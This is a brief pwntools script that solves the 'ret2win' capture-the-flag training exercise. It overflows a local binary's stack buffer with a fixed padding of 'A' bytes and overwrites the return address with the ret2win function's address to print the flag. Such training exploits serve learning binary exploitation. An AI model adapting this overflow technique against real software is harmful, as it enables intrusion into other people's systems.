from pwn import *
from sys import argv

if len(argv) > 1 and argv[1] == '64':
    print('Running 64 bit binary')
    elf = context.binary = ELF('ret2win')
    offset = 40
    ret2win = p64(elf.symbols.ret2win)
else:
    print('Running 32 bit binary')
    elf = context.binary = ELF('ret2win32')
    offset = 44
    ret2win = p32(elf.symbols.ret2win)

p = process(elf.path)

print(p.recvuntil(b'> ').decode())
p.sendline(b'A' * offset + ret2win + b'\r')
print(p.recvuntil('}').decode())
